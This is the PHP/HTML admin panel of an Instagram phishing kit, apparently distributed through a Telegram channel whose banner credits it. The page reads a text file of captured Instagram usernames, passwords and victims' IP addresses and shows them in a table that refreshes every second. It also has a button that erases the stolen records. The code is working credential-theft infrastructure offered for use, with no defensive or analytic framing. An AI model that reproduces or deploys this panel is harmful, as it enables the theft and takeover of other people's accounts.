<!--
#
# ____ ___  ______________________________     __________  _____    _________ _________ ____________________ 
#|    |   \/   _____/\_   _____/\______   \ /\ \______   \/  _  \  /   _____//   _____/ \______   \______   \
#|    |   /\_____  \  |    __)_  |       _/ \/  |     ___/  /_\  \ \_____  \ \_____  \   |    |  _/|       _/
#|    |  / /        \ |        \ |    |   \ /\  |    |  /    |    \/        \/        \  |    |   \|    |   \
#|______/ /_______  //_______  / |____|_  / \/  |____|  \____|__  /_______  /_______  /  |______  /|____|_  /
#                 \/         \/         \/                      \/        \/        \/          \/        \/ 
#
#                       BY USER:PASSBR CRIANÇÃO DO PAINEL ADM
#                       ~> https://t.me/urlpassbr
-->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 50px 0 0; /* Adiciona um pouco de padding superior para evitar sobreposição com a imagem de fundo */
            background-size: cover;
            background-position: top;
            background-repeat: no-repeat;
            background-color: black; /* Cor de fundo preta */
            position: relative; /* Posição relativa para permitir posicionamento absoluto do texto */
        }
        h2 {
            text-align: center;
            margin-top: 30px;
            color: white;
        }
        table {
            border-collapse: collapse;
            width: 100%;
            margin-top: 20px;
        }
        th, td {
            border: 1px solid #dddddd;
            text-align: left;
            padding: 8px;
            color: white;
        }
        th {
            background-color: #333333;
        }
        .clear-button {
            margin-top: 20px;
            text-align: center;
        }
        .clear-button input[type="submit"] {
            background-color: #ff5555;
            border: none;
            color: white;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }
        /* Media query para celular */
        @media screen and (max-width: 768px) {
            body {
                background-image: url('https://telegra.ph/file/6b7b6351c813c84d52683.jpg');
            }
        }
        /* Media query para computador */
        @media screen and (min-width: 769px) {
            body {
                background-image: url('https://telegra.ph/file/21ac108b319c6f8c70761.gif');
            }
        }
        /* Estilo para o texto no canto superior direito */
        .footer-text {
            position: absolute;
            top: 10px; /* Distância do topo */
            right: 10px; /* Distância da direita */
            color: #00FF00; /* Cor verde bem forte */
            font-size: 16px;
            font-weight: bold;
            font-family: Arial, sans-serif;
            text-decoration: none;
            border: 1px solid rgba(255, 255, 255, 0.5); /* Contorno RGBA com transparência */
            padding: 5px; /* Espaçamento interno */
        }
    </style>
</head>
<body>
    <h2>Admin Panel</h2>
    <?php
    // Função para limpar os dados capturados
    function clearData() {
        $usernames_file = 'instagram/usernames.txt';
        // Limpa o conteúdo do arquivo
        file_put_contents($usernames_file, '');
    }

    // Verifica se o botão de limpar foi clicado
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['clear'])) {
        clearData();
        // Redireciona de volta para o painel após a limpeza
        header('Location: adm.php');
        exit();
    }

    // Caminho para o arquivo usernames.txt na pasta instagram
    $usernames_file = 'instagram/usernames.txt';

    // Verifica se o arquivo usernames.txt existe
    if (file_exists($usernames_file)) {
        // Carrega o conteúdo do arquivo usernames.txt
        $usernames_data = file_get_contents($usernames_file);

        // Separa as linhas do arquivo em um array
        $usernames_entries = explode("\n", $usernames_data);

        // Remove a última entrada em branco (se houver)
        if (empty($usernames_entries[count($usernames_entries) - 1])) {
            array_pop($usernames_entries);
        }

        // Exibe a tabela com os dados
        echo '<table>';
        echo '<tr>';
        echo '<th>Username</th>';
        echo '<th>Password</th>';
        echo '<th>IP Address</th>';
        echo '</tr>';
        foreach ($usernames_entries as $entry) {
            $fields = explode(" | ", $entry);
            echo '<tr>';
            foreach ($fields as $field) {
                echo '<td>' . $field . '</td>';
            }
            echo '</tr>';
        }
        echo '</table>';
    } else {
        // Se o arquivo não existir, exibe uma mensagem de erro
        echo "O arquivo usernames.txt não foi encontrado na pasta instagram.";
    }
    ?>

    <div class="clear-button">
        <form method="post" action="">
            <input type="submit" name="clear" value="Clear Data">
        </form>
    </div>

    <!-- Texto no canto superior direito -->
    <a href="https://t.me/urlpassbr" class="footer-text" target="_blank">by: https://t.me/urlpassbr</a>

    <script>
        // Função para atualizar a tabela
        function updateTable() {
            location.reload(); // Recarrega a página para atualizar a tabela
        }
        
        // Atualiza a cada 1 segundo (1000 milissegundos)
        setInterval(updateTable, 1000);
    </script>
</body>
</html>

